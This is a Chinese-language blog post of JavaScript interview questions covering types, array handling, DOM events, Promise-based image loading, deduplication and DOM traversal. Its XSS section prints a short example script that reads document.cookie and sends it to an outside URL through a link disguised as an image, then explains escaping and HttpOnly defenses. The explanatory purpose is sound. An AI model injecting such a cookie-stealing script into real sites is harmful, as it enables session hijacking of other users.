---
title: "Web开发面试的那些题-JavaScript篇"
description: "Web 开发者面试题集第一篇，关于 JavaScript。"
date: 2018-08-29T00:00:00+08:00
draft: false
author: "Chris"
authorLink: "https://tianzhich.com"
tags: ["面试", "JavaScript"]
categories: ["编程"]
series: ["interview"]
series_weight: 1
featuredImage: "https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/18/1718c903eb6b3992~tplv-t2oaga2asx-zoom-crop-mark:1512:1512:1512:851.awebp"
---

Web 开发者面试题集第一篇，关于 JavaScript。

<!--more-->

{{< admonition abstract "写在前面" >}}
秋招提前批已经基本结束了，即将进入金九银十，正式的号角已经打响。春招，以及秋招提前批一路过来，断断续续也面了一些公司，自己在笔记上也有总结，甚至自己进行过一些猜题。发现基本问到的问题八九不离十，但是有些知识，特别是偏工程的知识点，如果没遇到过，很难产生深刻的印象。结合自己之前的笔记，也想在正式进入 9 月之前，整理一个面试题集系列，加深理解。
{{< /admonition >}}

## Null 和 Undefined 的区别

先执行一下基本类型检测

```javascript
console.log(typeof null, typeof undefined); // "object" "undefined"
```

从字面上看。两个值都表示某种东西的"缺失"。

将 object 数据类型进行 true，false 转换的时候，唯一一个为 false 的就是 null，null 表示的是引入对象的一种"缺失"，也可以说是空对象引用。最好理解的是，比如`document.getElementById('myEle')`，假设这个元素根本不存在，那么返回的就是 null。

在 JavaScript 里面，null 除非我们自己定义，然后就是上面提到的一种情况之外，我暂时没能想到还有哪里会隐式出现 null。而 undefined 就不同，在 console 里面我见到最多的一个错误便是

```shell
Uncaught TypeError: Cannot read property 'xxx' of undefined
```

往往在于我们没有对拿到的值是否为 undefined 进行判断，进而在 undefined 上继续取下一个属性，从而抛出错误，从这一点来看，undefined 不经意间出现还是挺多的，有下面几种常见情况

```javascript
// 1. 数组中访问'越界'的元素
var arr = [1, 2];
console.log(arr[2]); // undefined

// 2. 对象中访问未定义的属性
var obj = { a: 1 };
console.log(obj.b); // undefined

// 3. 函数调用时参数没有提供完整，访问了未提供的参数
function func(a, b, c) {
  console.log(a, b, c);
}
func(1, 2); // 1 2 undefined

// 4. 变量声明后没有赋值
var a;
console.log(a); // undefined

// 5. 对没有赋值的变量(或者压根没有声明的变量)使用typeof类型检测
var a;
console.log(typeof a, typeof b); // "undefined" "undefined"
console.log(b); // 要注意这样会直接报错 "Uncaught ReferenceError: b is not defined"
```

由于 undefined 出现情况很多，而且大多都是我们不良编程习惯导致，或者是不经意间发生，所以我们一般不会显式把一个变量声明为 undefined，这样会造成二义性，上面的第 5 点使用 typeof 进行类型检测就是二义性之一，还有一种二义性如下

```javascript
var obj1 = {};
var obj2 = { color: undefined };
if (obj1.color === obj2.color) {
  /* do something */
} // Don't do this!!!
```

所以我们习惯上初始化一个变量为 null，而且使用全等操作符(避免相等操作符发生类型转换)

还需要知道，Undefined 数据类型的唯一值就是 undefined，Null 数据类型的唯一值就是 null

最后，关于 JS 中为什么要定义两种类型来表示"缺失"，以及他们的历史来源，建议读一下阮一峰老师的[这篇文章](http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html#comment-305647)，评论处有一些讨论，我觉得还是挺有意思的

## JS 中有哪些数据类型

首先我们要知道 JS 变量是松散类型的，可以保存任何数据类型

5 中简单数据类型（也称基本数据类型）：Undefined, Null, Boolean, String, Number(后三种可以封装成为 Object)

1 种复杂数据类型：Object

ES6 新数据类型：Symbol

使用 typeof 进行类型检测，有七种返回情况: "undefined", "object"(Array & null), "boolean", "string", "number", "symbol", "function"，值得注意以下几种特殊情况

```js
// 1. Number()是转换函数，返回值还是一个'number'，但是new Number()是调用构造函数，封装成一个对象
// Boolean和String也是如此
console.log(typeof new Number(), typeof Number()); // "object" "number"

// 2. function的几种特殊情况
function func() {}
var a = new Function();
var b = new func(); // 构造函数式调用，会返回一个新的对象
console.log(typeof func, typeof a, typeof b); // "function" "function" "object"
```

Boolean 数据类型的转换规则（这个和题目无关，但是记住很有用）

| 数据类型  | true                                         | false        |
| --------- | -------------------------------------------- | ------------ |
| Boolean   | true                                         | false        |
| String    | 任何非空字符串                               | ""(空字符串) |
| Number    | 任何非零数值（包括正负无穷）                 | 0 和 NaN     |
| Object    | 任何对象                                     | null         |
| Undefined | n/a（或 N/A）,not applicable, 意思是“不适用” | undefined    |

## Array 检测有几种方法

1. 使用 instanceof, 例如`console.log(arr instanceof Array) // true`

2. 使用自身的 constructor 属性, 例如`console.log(arr.constructor === Array) // true`

3. 使用 ES6 的`Array.isArray(arr)`检测

4. 使用对象原生 toString()方法判断：`Object.prototype.toString.call(arr) === "[object Array]"`，注意这里不是使用`Array.toString()`，这个方法会将数组里的元素调用`toString()`后的结果以","为间隔拼接成字符串返回

注意上面的前两种方法判断不同 document 或者 iframe 下的 Array 时会失败，因为跨 iframe 实例化的对象不能共享原型链，是不同的对象，所以最好的解决办法是自己结合后两个方法写一个判断数组的函数

```javascript
const isArray = (() => {
  if (Array.isArray) {
    return Array.isArray;
  }
  var arr = [];
  return function (array) {
    return (
      Object.prototype.toString.call(array) ===
      Object.prototype.toString.call(arr)
    );
  };
})();
```

## 对象属性遍历的方法

1. 使用`for(let prop in obj){}`可以遍历对象属性，这种方法既可以遍历自有属性也可以遍历继承自原型的属性，只要属性的`[[Enumerable]]`特性为`true`，对于直接在对象上定义的属性，这个特性默认为`true`
2. 如果只想遍历实例属性，可以使用`Object.keys(obj)`或者`Object.getOwnPropertyNames(obj)`，两者均返回一个数组，数组的每一项是 obj 的 key 值，在此基础上使用`forEach()`即可遍历。两者区别在于前者只会遍历可枚举的自身属性，而后者不可枚举的自身属性也能遍历
3. 使用`Reflect.ownKeys(obj)`，该方法除了具有`getOwnPropertyNames()`功能外，还能遍历以 Symbol 作为 key 值的对象属性，而前面两种都不能遍历 Symbol()

```javascript
var obj = { a: 1, b: 2 };
Object.defineProperty(obj, "c", {
  value: 3,
  enumerable: false,
});
Object.prototype.d = 4;
obj[Symbol(1)] = 5;

console.log(Object.keys(obj)); // ["a", "b"]
console.log(Object.getOwnPropertyNames(obj)); // ["a", "b", "c"]
console.log(Reflect.ownKeys(obj)); // ["a", "b", "c", Symbol(1)]

var forInKeys = [];
for (let key in obj) {
  forInKeys.push(key);
}
console.log(forInKeys); // ["a", "b", "d"]
```

注意，使用`Reflect.ownKeys(obj)`相当于`Object.getOwnPropertyNames(obj).concat(Object.getOwnPropertySymbols(obj))`

## JavaScript 中 0.1+0.2 为什么不等于 0.3

关于这个问题，我[这篇文章](../why-js-01-02-not-equal-to-03)中已经进行了深入的探讨

## mouse leave 和 mouse out 事件的区别

主要区别在于 mouseleave 事件不冒泡，而 mouseout 事件冒泡；类似的还有 mouseenter 和 mouseover

<iframe height='343' scrolling='no' title='mouseleave和mouseout的区别' src='//codepen.io/tianzhich/embed/mGOaPG/?height=343&theme-id=dark&default-tab=css,result&embed-version=2' frameborder='no' allowtransparency='true' allowfullscreen='true' style='width: 100%;'>See the Pen <a href='https://codepen.io/tianzhich/pen/mGOaPG/'>mouseleave和mouseout的区别</a> by Tian Zhi (<a href='https://codepen.io/tianzhich'>@tianzhich</a>) on <a href='https://codepen.io'>CodePen</a>.
</iframe>

主要看外层的 mouseout 事件，完整地移动过外层 div，会触发其 mouseout 三次

1. 第一次触发因为进入了内层，此时相当于移开了外层，被触发
2. 第二次因为离开了内层，由于内层的 mouseout 事件冒泡，被触发
3. 第三次因为真真实实离开了外层，被触发

第一次触发一开始我不是很理解，查了 MDN 文档的相关解释才懂，下面三条加粗语句分别代表上述三种情况

> The mouseout event is fired when a pointing device (usually a mouse) is **moved off the element** that has the listener attached **or off one of its children**. Note that **it is also triggered on the parent when you move onto a child element**, since you move out of the visible space of the parent.

## 一个区域内的多张图片，怎么判断他们全部加载完成

当时还不知道 Promise，甚至对异步也是一知半解的时候遇到这个问题，错的当然也是很离谱

使用 Promise 结合 Promise.all()可以判断图片是否全部加载完成。我这里是使用创建 img 标签插入到 DOM 中判断，也可以在 document.DOMContentLoaded()中判断已经在 DOM 节点中的 img 是否加载完成，道理类似

也可以直接在我的[CodePen](https://codepen.io/tianzhich/pen/MqbdXG)上运行

```javascript
const imgUrls = [];
const loadImage = (imgUrl) => {
  let img = document.createElement("img");
  img.src = imgUrl;
  img.alt = "";
  img.height = 300;
  return new Promise((resolve, reject) => {
    img.onload = function () {
      resolve("图片加载成功");
      document.getElementById("container").appendChild(img);
    };
    img.onerror = function () {
      reject("图片未能成功加载，请稍后重试！");
    };
  });
};

const loadAllImage = (imgUrls) => {
  return Promise.all(
    imgUrls.map((imgUrl, i) =>
      loadImage(imgUrl)
        .then((res) => {
          console.log(`第${i + 1}张${res}`);
          return Promise.resolve();
        })
        .catch((err) => {
          console.log(`第${i + 1}张${err}`);
          return Promise.resolve();
        })
    )
  );
};

loadAllImage(imgUrls).then(() => {
  console.log("图片全部加载完毕");
});
```

## XSS 是什么，怎么防止 XSS

XSS(Cross-Site-Scripting)，跨站脚本攻击，也叫做脚本注入

当服务器完全信赖客户端提交的数据时，就可能发生脚本注入。例如，当用户提交表单时，提交了一段 script 代码，服务器将这段代码存储起来，下次其他用户访问时，这段代码被加载

在代码中我们可以获取用户 cookie，并将其发送到我们自己的服务器，例如下面就是一段简单的脚本

```javascript
var cookie = document.cookie; // 获取cookie
var a = document.createElement("a");
a.href = `http://www.tianzhich.com/test.php?secret=${cookie}`;
a.innerHTML = "<img src='./fake.jpg' alt=''/>"; // 伪装图片
document.body.appendChild(a);
```

当下次别的用户访问时，这段代码被记载，一旦用户不小心点击到伪装图片，cookie 就会被发送到我们的主机

从上面来看，防治 XSS 有两种主要方式

1. **防止特殊的字符出现**，这些字符主要是对于 HTML 文档有特殊意义的字符

   客户端表单数据值类型检测和验证

   服务器对用户提交的表单数据进行严格验证

   主要是将相应的符号转换成 HTML 实体字符，像`<`或者`>`这些字符是不允许出现在文本中的，因为他们对于 HTML 文档来说有特殊意义。如果我们要在 HTML 文档中展示这些字符，应该使用它们的转义字符，例如`<`转义字符为`&lt;`，所以客户端或者服务器应该将提交上来的这些字符进行编码，或者过滤掉这些字符

2. 让服务器将重要的 cookie 标记为`http-only`，也就是在 response header 中设置
   `set-cookie: xxx;HttpOnly`

这里分别使用 jQuery 和原生 JS 实现对特殊字符的加密和解密

```javascript
// jQuery
const htmlEncoderJq = (str) => {
  return $("<div>").text(str).html();
};
const htmlDecoderJq = (str) => {
  return $("<div>").html(str).text();
};
// JS
const htmlEncoderJs = (str) => {
  let div = document.createElement("div");
  div.textContent = str;
  return div.innerHTML;
};
const htmlDecoderJs = (str) => {
  let div = document.createElement("div");
  div.innerHTML = str;
  return div.textContent;
};
```

## JS 中定义变量的 var, let, const 有什么区别

`var`是 ES5 中定义变量的方式，定义的变量只有全局作用域和函数作用域之分

ES6 引入了`let`和`const`，前者定义的变量有了块级作用域的概念。后者表示定义一个常量，这里的常量用 C 语言来说，类似于 C 的指针，定义一个指针为常量，只是说这个指针不能指向别的内存地址(不能指向别的对象)，但是其自身内存地址的内容是可以访问和修改的

## 数组去重的方法

数组去重的方式网上太多了，总结起来就三大类，首先直接遍历，不使用数组的其他方法；然后可以使用数组的方法进行去重，或者使用 ES6 的 Set 和 Map 数据结构；最后扩展一下，考虑下其他数据类型的去重结果

1. 使用原始方法

```javascript
function distinct(arr) {
  var resArr = [];
  for (var i = 0; i < arr.length; i++) {
    var cur = arr[i];
    for (var j = 0; j < resArr.length; j++) {
      if (cur === resArr[j]) {
        break;
      }
    }
    if (j === resArr.length) {
      resArr.push(cur);
    }
  }
  return resArr;
}
```

2. 使用数组方法(splice)，会修改原数组

```javascript
function distinct(arr) {
  for (var i = 0; i < arr.length; i++) {
    var cur = arr[i];
    for (var j = i + 1; j < arr.length; j++) {
      if (cur === arr[j]) {
        arr.splice(j--, 1); // 数组长度动态变化，j记得减1
      }
    }
  }
  return arr;
}
```

3. 使用数组方法(indexOf+filter)

   关于这两个方法也可以只用其一，搭配其他方法，或者自己写循环，但是原理差不多

```javascript
const distinct = (arr) => {
  return arr.filter((v, k) => arr.indexOf(v) === k);
};
```

4. 使用数组方法(sort+filter)，会修改原数组

   这两个方法也可以只选其一，搭配其他方法使用，或者自己写循环，但是原理差不多

```javascript
const distinct = (arr) => {
  return arr.sort().filter((v, k) => v !== arr[k + 1]);
};
```

5. ES6 Map(Map.prototype.set()返回原 Map)

```javascript
const distinct = (arr) => {
  const resMap = new Map();
  return arr.filter((v) => !resMap.has(v) && resMap.set(v, 1));
};
```

6. ES6 Set

```javascript
const distinct = (arr) => {
  return [...new Set(arr)]; // 或者 return Array.from(new Set(arr));
};
```

7. 其他数据类型使用上述方法去重的检验结果

```javascript
var arr = [
  1,
  2,
  null,
  2,
  "1",
  "1",
  NaN,
  NaN,
  undefined,
  null,
  new String(1),
  undefined,
  new String(1),
];
```

| 方法           | 结果                                                                   |
| -------------- | ---------------------------------------------------------------------- |
| 原始方法       | `NaN`和`String {"1"}`不能去重                                          |
| splice         | `NaN`和`String {"1"}`不能去重，`undefined`为`empty`                    |
| filter+indexOf | `String {"1"}`不能去重，`NaN`全被过滤                                  |
| filter+sort    | `NaN`不能去重，`undefined`全被过滤，`1, String {"1"}, "1"`无法正确判断 |
| Map            | `String {"1"}`不能去重                                                 |
| Set            | `String {"1"}`不能去重                                                 |

以上的结果只要关注几个点

1.  `new String {"1"}`和`new String {"1"}`并不是同一个对象，如果非要把他们当成同一对象，我们可以使用对象的`hasOwnProperty(typeof arr[i] + arr[i])`来判断，如果没有就新增一个 key，但是我还是认为上面的两个是不同的对象实例

2.  要注意`console.log(NaN===NaN) // false`，所以造成有些方法不能去重，有些筛选机制直接过滤，但是在 Map 和 Set 中，即使这两个不相等，但是会把他们当成相同的东西看待

3.  最后就是 sort 方法，MDN 给出的解释非常详细

    > The **`sort()`** method sorts the elements of an array _in place_ and returns the array. The sort is not necessarily stable. The default sort order is according to string Unicode code points.

    `sort()`对于`1, String{"1"}, "1"`来说是一视同仁的，因此在此基础上使用`filter()`判断时和三者在原数组中的顺序有关。不能准确去重

## DOM 节点的深度遍历和广度遍历

广度遍历（BFS）比较简单，类似于二叉树的层次遍历，使用队列模拟当前一层，每出队列一个节点，则将其加入到最终结果数组里，并且将其的子节点全部入队，直到队列为空

```javascript
// BFS
function travelsalBFS(root) {
  var tempArr = [];
  var resArr = [];
  tempArr.push(root);
  while (tempArr.length) {
    let len = tempArr.length;
    while (len--) {
      let tempNode = tempArr.shift();
      resArr.push(tempNode);
      if (tempNode.children) {
        tempArr = [...tempArr, ...Array.from(tempNode.children)];
      }
    }
  }
  return resArr;
}
```

当然，我们也可以不出队列，只入队列，使用`index`记录下当前访问到的节点，每访问完就将其子节点全部入队，直到全部节点都被访问

```javascript
// BFS 不使用临时array
function travelsalBFS2(root) {
  var resArr = [];
  resArr.push(root);
  var index = 0;
  while (resArr[index]) {
    resArr.push(...Array.from(resArr[index++].children));
  }
  return resArr;
}
```

深度遍历稍微复杂一点，我想到的是从根节点开始，每次访问其第一个子节点，直到某个节点没有子节点，此时将该元素从临时数组`pop`出来，访问其兄弟节点（如果访问不到则继续`pop`），直到访问到一个存在的兄弟节点，并把它作为当前节点，重复步骤。那么何时结束呢？刚才说到访问不到兄弟节点会一直`pop`，当把第一个根节点 pop 出来的时候，也就访问完毕了，可以返回结果数组

```javascript
// DFS
function travelsalDFS(root) {
  var tempArr = [root];
  var resArr = [root];
  var curEle = root;
  while (tempArr.length || curEle.children.length !== 0) {
    if (curEle.children.length === 0) {
      curEle = tempArr.pop();
      while (!curEle.nextElementSibling) {
        curEle = tempArr.pop();
        // 这个地方，如果回到root，则遍历完毕！
        if (!curEle || curEle === root) {
          return resArr;
        }
      }
      curEle = curEle.nextElementSibling;
    } else {
      curEle = curEle.firstElementChild;
    }
    // 访问到的节点都要存起来，不同的是临时数组会pop出去，从而向上返回
    resArr.push(curEle);
    tempArr.push(curEle);
  }
}
```

关于节点访问，我这里为了简单起见都称作节点了。但是要记住 DOM 元素和 DOM 节点是不同的，准确来说以上的应该都是 DOM 元素，因为 DOM 节点还包括了文本节点，注释节点等等

要注意`children`和`childNodes`，`firstElementChild`和`firstChild`，`nextElementSibling`和`nextSibling`的区别，前者访问到的是元素，例如`children`返回的是`HTML Collection`。后者访问到的是节点，例如`childNodes`返回的是`NodeList`，这两种类型都是类数组类型，可以使用`Array.from`转换成数组
